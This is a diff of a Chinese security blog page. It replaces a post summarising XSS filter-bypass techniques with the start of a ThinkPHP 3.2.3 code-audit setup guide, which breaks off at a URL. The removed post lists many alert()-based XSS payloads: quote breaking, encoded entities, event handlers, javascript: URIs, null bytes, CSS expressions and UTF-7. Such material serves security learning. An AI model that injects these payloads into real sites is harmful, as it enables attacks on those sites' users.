@@ -5,14 +5,19 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
-    <meta name="keywords" content="XSS绕过技术学习总结, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
+    <meta name="keywords" content="ThinkPHP框架代码审计——环境配置与控制器, Erikten 计算机 网络安全 黑客 网络攻防 渗透测试 安全开发 代码审计 PHP Python 漏洞挖掘 0day">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
     <meta name="google-site-verification" content="pBWoGvVEP36FzzS4xIpoMejc5UKi3RKcxd9rWWcjiDg">
     <meta name="360-site-verification" content="2db45fc772bbd3e7efd0985eec0fff97">
-    <meta name="description" content="XSS分类
-非持久型
-非持久性:非持久性 XSS 也被称为反射性 XSS，是目前最普遍的类型，当攻击者提供了一些代码的时候，服务器端马上就会返回页面的执行结果。举个例子，就比如某个网页上的搜索引擎，如果攻击者搜索的字符串包含了一些 html">
+    <meta name="description" content="环境配置以下是我ThinkPHP框架代码审计系列的环境配置：
+
+PHP版本：5.6
+Mysql版本：5.5
+Apache版本：2.4
+ThinkPHP版本：3.2.3
+
+去网上下载完ThinkPHP的源码包后，解压到网站根目录（或子目录）下">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +26,7 @@
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="baidu-site-verification" content="wvlc3L96QK">
-    <title>XSS绕过技术学习总结 | Erikten</title>
+    <title>ThinkPHP框架代码审计——环境配置与控制器 | Erikten</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -730,13 +735,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E9%A3%8E%E6%99%AF/12.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/LuckyZmj/imgbed/galleries/%E5%8A%A8%E6%BC%AB%E6%8F%92%E7%94%BB/01.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        XSS绕过技术学习总结
+                        ThinkPHP框架代码审计——环境配置与控制器
                     </div>
                 </div>
             </div>
@@ -856,16 +861,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/渗透测试/" target="_blank">
-                                <span class="chip bg-color">渗透测试</span>
+                            <a href="/tags/代码审计/" target="_blank">
+                                <span class="chip bg-color">代码审计</span>
                             </a>
                         
-                            <a href="/tags/XSS/" target="_blank">
-                                <span class="chip bg-color">XSS</span>
+                            <a href="/tags/ThinkPHP/" target="_blank">
+                                <span class="chip bg-color">ThinkPHP</span>
                             </a>
                         
-                            <a href="/tags/WAF绕过/" target="_blank">
-                                <span class="chip bg-color">WAF绕过</span>
+                            <a href="/tags/环境搭建/" target="_blank">
+                                <span class="chip bg-color">环境搭建</span>
                             </a>
                         
                     </div>
@@ -876,8 +881,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/渗透测试篇/" class="post-category" target="_blank">
-                                渗透测试篇
+                            <a href="/categories/代码审计篇/" class="post-category" target="_blank">
+                                代码审计篇
                             </a>
                         
                     </div>
@@ -888,7 +893,7 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-06
+                    2021-06-11
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -902,14 +907,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        2.4k
+                        1.4k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        9 分
+                        6 分
                     </div>
                     
                 
@@ -926,139 +931,238 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="XSS分类"><a href="#XSS分类" class="headerlink" title="XSS分类"></a>XSS分类</h3><ul>
-<li><p>非持久型</p>
-<p>非持久性:非持久性 XSS 也被称为反射性 XSS，是目前最普遍的类型，当攻击者提供了一些代码的时候，服务器端马上就会返回页面的执行结果。举个例子，就比如某个网页上的搜索引擎，如果攻击者搜索的字符串包含了一些 html 标签，通常来说，搜索的结果就会以该形式显示出来，或者，至少，搜索的字符串会包含在页面里。而这个我们是可以修改的，如果任何搜索的字符串都没有被 html 编码，XSS 漏洞就产生了。</p>
-</li>
-<li><p>持久型</p>
-</li>
-</ul>
-<p>持久性 XSS:也叫做存储型 XSS，或是二次漏洞，他能够导致更加有效的攻击。当攻击者提交到 web 应用程序里的数据会永久性的存储到服务器的时候会产生这类漏洞，(比如数据库，文件系统，其他位置)，之后，如果没有经过 HTML 编码，那么每一个访问该页面的用户都会被攻击，典型的例子就是在线留言板，它允许用户提交数据。</p>
+                <h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>以下是我ThinkPHP框架代码审计系列的环境配置：</p>
 <ul>
-<li>Dom型</li>
+<li>PHP版本：5.6</li>
+<li>Mysql版本：5.5</li>
+<li>Apache版本：2.4</li>
+<li>ThinkPHP版本：3.2.3</li>
 </ul>
-<p>基于 DOM 的 XSS:也叫做本地跨站，基于 html/xml 上叫做文档对象模型(DOM)的标准对象模型，这类漏洞，问题出现在页面的客户端脚本上，比如，如果一个 javascript 脚本处理 url 请求参数，然后使用这个参数值来显示给用户页面，没有经过任何编码，那么 XSS 漏洞产生，和非持久的类似，攻击者可以用恶意代码填充这个参数，然后覆写的页面诱骗用户点击，然后就会被浏览器解析成 html，包含了恶意的脚本<br>代码。</p>
-<h3 id="发现XSS漏洞"><a href="#发现XSS漏洞" class="headerlink" title="发现XSS漏洞"></a>发现XSS漏洞</h3><p>最常用的 XSS 漏洞测试代码：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>当这个代码被注入到输入框或是 url 参数的时候，会成功也可能会失败，如果失败了。也不意味着网站就是安全的。需要继续渗透。</p>
-<h3 id="转义字符串绕过"><a href="#转义字符串绕过" class="headerlink" title="转义字符串绕过"></a>转义字符串绕过</h3><p>第一步是查看当前的页面源代码，看看是不是包含了我们的这个测试的字符串，如果你发现了。你就会发现很有意思。要细心。看到了把。是在一个输入(INput)标签里。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>在这个例子，我们可以修改我们的输入来包含两个字符，来让代码跳出那对外围的单引号。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript">'<span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>现在我们的代码执行了。因为我们闭合了前面的 html 标签，就触发了 XSS，但是，你可能会发现，页面上会显示一个多出来的单引号，为什么，因为后面的那个原来的单引号没有匹配，我们继续修改我们的代码。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token string">'>&lt;SCRIPT>alert("XSS")&lt;/SCRIPT>&lt;xss a='</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>所有的输入就会变成这样:</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">''</span><span class="token operator">></span><span class="token operator">&lt;</span>SCRIPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span class="token operator">&lt;</span>xss a<span class="token operator">=</span><span class="token string">''</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>好了。Javascript 代码就注入了。<xss a="”">这个没什么意义，你可以自己改，但是符合 html 的标准，页面不会出错。</xss></p>
-<h3 id="单引号过滤绕过"><a href="#单引号过滤绕过" class="headerlink" title="单引号过滤绕过"></a>单引号过滤绕过</h3><p>同样的例子，但是我们假设管理员在我们的单引号之前放置了一个“\”，有时候双引号之前也会放置，通过一些类似 add_slashes 的函数可以实现，这个就是转义字符，我们先前的代码就会变成这样：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'\'>&lt;SCRIPT>alert(\"XSS\")&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>有一些方法可以继续，但是要看过滤的那个函数是怎么放的了。其中一个方法就是使用字符实体，学过 html的都知道，就是一些特殊字符会用一些固有的符号组合来表示，举个例子，你不能用&lt;&gt;表示大于和小于，因为这被解释为 html 标签，但是，你如果要用，可以用下面的来代替。<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223175517702.png" alt="在这里插入图片描述"><br>使用 &amp;quot ; 或者 &amp;#34 ;来代替我们的双引号，有时候可以绕过过滤。（分号前都加了空格，不然会转义），例子：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>#<span class="token number">38</span><span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>#<span class="token number">38</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>如果这都被过滤了。那我们可以使用 JavaScript 的 fromCharCode 函数，这个函数把指定的 Unicode值转换成字符串。例如：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
-<span class="token operator">&lt;</span>INPUT type<span class="token operator">=</span><span class="token string">"text"</span> value<span class="token operator">=</span><span class="token string">'\'>&lt;SCRIPT>alert(String.fromCharCode(88,83,83))&lt;/SCRIPT>'</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>你可以使用 Mysql 数据库的 char（字符，字符）来转换字符到字符码，大家可以使用自己喜欢的就行了。转码的工具还是很多的。</p>
-<h3 id="lt-SCRIPT-gt-过滤绕过"><a href="#lt-SCRIPT-gt-过滤绕过" class="headerlink" title="&lt; SCRIPT&gt;过滤绕过"></a>&lt; SCRIPT&gt;过滤绕过</h3><p>有些过滤器会过滤到&lt; script&gt;标签，那上面的例子就都废了，但是。还是有方法插入 javascript 的。我们看看事件处理器的例子。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>BODY onload<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>在 html 里啊。这个 Onload 关键字就是一个事件，其他的所有标签都没有这个属性，但是 Body 标签是有的。但是，有一定的局限性，如果 onload 事件在你的代码之前已经被处理了。那就不会触发了。。不过我们可以继续看看 onerror 事件处理。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">""</span> onerror<span class="token operator">=</span><span class="token string">"alert('XSS')"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>注意看，图片没有指定，也就是出错了。Onerror 这个事件就会发茶。引发 XSS 漏洞，没有用<script>标签哦。</p>
-<h3 id="使用IMG源绕过"><a href="#使用IMG源绕过" class="headerlink" title="使用IMG源绕过"></a>使用IMG源绕过</h3><p>Html 中最常用的两个标签 img 和 a href 一般是不会过滤的，一个指定图片，一个指定超链接。最危险的事 img 标签。</p>
-<p>下面是一些例子：</p>
-<p>标准的样子：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>没有双引号和分号：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>过滤了双引号和< Script></p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>XSS<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>使用 CharCode 绕过过滤:</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">88</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">,</span><span class="token number">83</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>有经验的攻击者也可以把上面的全部转换成相等的 Ascii 码:</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG
-SRC<span class="token operator">=</span><span class="token operator">&amp;</span>#<span class="token number">106</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">118</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">112</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">58</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">10</span>
-<span class="token number">1</span><span class="token punctuation">;</span> <span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">88</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">83</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">83</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>使用 Ascii 表你可以自己试试。当然转换成 16 进制也是可以的。。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG
-SRC<span class="token operator">=</span><span class="token operator">&amp;</span>#x6A<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x76<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x73<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x63<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x69<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x70<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x3A<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x61<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x6C
-<span class="token punctuation">;</span><span class="token operator">&amp;</span> #x65<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x72<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x74<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x28<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x27<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x58<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x53<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x53<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x27<span class="token punctuation">;</span><span class="token operator">&amp;</span>#x29<span class="token punctuation">;</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<h3 id="使用制表符、-换行符和回车符绕过"><a href="#使用制表符、-换行符和回车符绕过" class="headerlink" title="使用制表符、 换行符和回车符绕过"></a>使用制表符、 换行符和回车符绕过</h3><p>这些符号都是可以用来欺骗过滤器的。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"jav&amp;#x9ascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>上面的例子使用了最小的十六进制的制表符来欺骗过滤器。最后的输出结果不变：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>对应转换表：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20200223180734832.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<h3 id="使用空字符进行绕过"><a href="#使用空字符进行绕过" class="headerlink" title="使用空字符进行绕过"></a>使用空字符进行绕过</h3><p>另一个可以绕过的就是空字符，这是最有效的工具了。。<br>下面这个就是个例子：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>SCR<span class="token operator">%</span>00IPT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>SCRIPT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>空字符 (%00) 使得过滤器不能看到完整的 < SCRIPT> 标签， 只在 IE 6.0, IE 7.0 可以。</p>
-<h3 id="双引号配对绕过"><a href="#双引号配对绕过" class="headerlink" title="双引号配对绕过"></a>双引号配对绕过</h3><p>绕过这种过滤就是寻找闭合的标签，然后构造来突破</p>
-<p>比如：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG <span class="token string">""</span><span class="token string">">&lt;SCRIPT>alert('XSS')&lt;/SCRIPT>"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>通常我们认为，img 标签里。前两个引号被认为是一对，什么都不做，下一个引号和最后的匹配，但是事实不是这样，所有的浏览器都在试图修正这一问题。</p>
-<p>最终结果如下：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>"<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="CSS过滤器绕过"><a href="#CSS过滤器绕过" class="headerlink" title="CSS过滤器绕过"></a>CSS过滤器绕过</h3><p>HTML 标签用来插入 javaScript 很有用，但是 CSS 也是可以的哦。有很多方式向 CSS 里插入 XSS，所有更多的方法可以攻击，嘴尖的方法是吧 XSS 代码放到 LINK 方式引用的 CSS 的 href 属性里面去。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>LINK REL<span class="token operator">=</span><span class="token string">"stylesheet"</span> HREF<span class="token operator">=</span><span class="token string">"javascript:alert('XSS');"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>Ie7 已经不允许了。但是 opera 和 ie6 还是可以的。。另一个方式是使用<STYLE>标签，不是很常见，一般是论坛啊。允许用户设计自己的贴的源代码的时候。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>STYLE<span class="token operator">></span> a <span class="token punctuation">{</span> width<span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span> <span class="token operator">&lt;</span><span class="token operator">/</span>STYLE<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>还有一种方式</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>DIV STYLE<span class="token operator">=</span><span class="token string">"width: expression(alert('XSS'));"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h3 id="不全面的过滤器"><a href="#不全面的过滤器" class="headerlink" title="不全面的过滤器"></a>不全面的过滤器</h3><p>我们看看当开发者已经把能想到的都过滤了或者什么的。就安全了吗？不。我们可以依然可以向数据指令(我前段时间还看到了。现在忘了这个准确的翻译了)里插入代码。我们通过 base64 加密< script>alert(‘XSS’)</script>。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>META HTTP<span class="token operator">-</span>EQUIV<span class="token operator">=</span><span class="token string">"refresh"</span>
-CONTENT<span class="token operator">=</span><span class="token string">"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>数据指令允许我们把完全的文档变成一个单一的字符串。在火狐等浏览器都可以用。尼玛没说具体的用法。</p>
-<ul>
-<li>使用双引号</li>
-</ul>
-<p>如果你需要使用双引号和单引号。使用一些诡异的用法把。。</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert("Look its, 'XSS'")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>转义字符</li>
-</ul>
-<p>转义字符有时候很有用，可以对付一些简单的过滤器</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert(\"XSS\")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>结果如下：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token template-string"><span class="token string">`javascript:alert(\\"XSS\\")`</span></span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<ul>
-<li>编码</li>
-</ul>
-<p>使用 utf-7 编码可以绕过<br>比如：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"XSS"</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>使用UTF-7后：</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">+</span>ADw<span class="token operator">-</span>script<span class="token operator">+</span>AD4<span class="token operator">-</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token operator">+</span>ACI<span class="token operator">-</span>XSS<span class="token operator">+</span>ACI<span class="token operator">-</span><span class="token punctuation">)</span><span class="token operator">+</span>ADw<span class="token operator">-</span><span class="token operator">/</span>script<span class="token operator">+</span>AD4<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>然后所有的加号需要被改成%2b，否则会被浏览器识别为连接符</p>
-<pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token operator">%</span>2BADw<span class="token operator">-</span>script<span class="token operator">%</span>2BAD4<span class="token operator">-</span>alert<span class="token operator">%</span><span class="token number">281</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>2BADw<span class="token operator">-</span><span class="token operator">/</span>script<span class="token operator">%</span>2BAD4<span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>一个列表:（这恶鬼终于不会被转义了！）</p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>实体引用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>空格</td>
-<td>%20</td>
-</tr>
-<tr>
-<td>/</td>
-<td>%2F</td>
-</tr>
-<tr>
-<td>“</td>
-<td>%22</td>
-</tr>
-<tr>
-<td>?</td>
-<td>%3F</td>
-</tr>
-<tr>
-<td>+</td>
-<td>%2B</td>
-</tr>
-</tbody></table>
-<p>以上就是我对XSS绕过技术的学习总结，欢迎大家补充！</p>
+<p>去网上下载完ThinkPHP的源码包后，解压到网站根目录（或子目录）下，访问即可：<br><a href="https://imgtu.com/i/2h2YlR" target="_blank" rel="noopener"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://z3.ax1x.com/2021/06/11/2h2YlR.png" alt="2h2YlR.png"></a></p>
+<p>出来这个笑脸以后我们就算是搭建起来了，接下来就是访问一下它控制器下的方法，一共有四种模式，我就写一下我常用的两种</p>
+<p>普通模式：</p>
+<pre><code>http://www.tp.cn/index.php?m=home&amp;c=index&amp;a=index
